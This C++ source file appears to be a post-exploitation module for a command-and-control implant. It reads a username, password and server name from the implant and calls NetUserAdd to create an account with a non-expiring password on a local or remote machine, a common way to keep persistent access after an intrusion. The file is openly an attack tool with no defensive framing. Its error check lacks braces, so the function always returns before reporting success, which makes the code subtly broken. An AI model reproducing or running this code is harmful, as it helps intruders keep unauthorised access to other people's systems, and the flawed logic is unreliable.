#include <Common.hpp>

/**
 * @brief Entry point of the program.
 * 
 * @param Args Pointer to the arguments passed to the program (as a string).
 * @param Argc Count of arguments passed to the program.
 */
auto AddUser(
    _In_ PCHAR Args,
    _In_ INT   Argc
) -> void {
    Data Parser = { 0 };
    BeaconDataParse( &Parser, Args, Argc );

    // 
    // Extracting information about the user to be added
    // 
    PCWSTR Username  = ( PCWSTR )BeaconDataExtract( &Parser, NULL );
    PCWSTR Password  = ( PCWSTR )BeaconDataExtract( &Parser, NULL );
    PCWSTR ServeName = ( PCWSTR )BeaconDataExtract( &Parser, NULL );

    Printf( "[-] Adding a user\n" );
    Printf( "\tUsername: %ws\n", Username );
    Printf( "\tPassword: %ws\n", Password );
    Printf( "\tServeName: %ws\n", ServeName != NULL ? ServeName : L"Local Machine" );

    //
    // Adding a user
    //
    USER_INFO_1 UserInfo    = { 0 };
    UserInfo.usri1_name     = ( LPWSTR )Username;
    UserInfo.usri1_password = ( LPWSTR )Password;
    UserInfo.usri1_priv     = USER_PRIV_USER;
    UserInfo.usri1_flags    = UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    
    DWORD ErrorCode = NetUserAdd( ServeName, 1, ( LPBYTE )&UserInfo, NULL );
    if ( ErrorCode != NERR_Success ) 
        BeaconPrintf( CALLBACK_ERROR, "[-] Error when adding user: %d\n", ErrorCode );
        return;

    BeaconPrintf( CALLBACK_OUTPUT, "[+] Success in adding the user" );
    PrintOutput( TRUE );
    return;
}

/**
 * @brief Wrapper function to call the main logic.
 * 
 * @param Args Pointer to the arguments passed to the program (as a string).
 * @param Argc Count of arguments passed to the program.
 */
EXTERN_C 
auto go(
    _In_ PCHAR Args,
    _In_ INT   Argc
) -> void {
    Start();
    return AddUser( Args, Argc );
}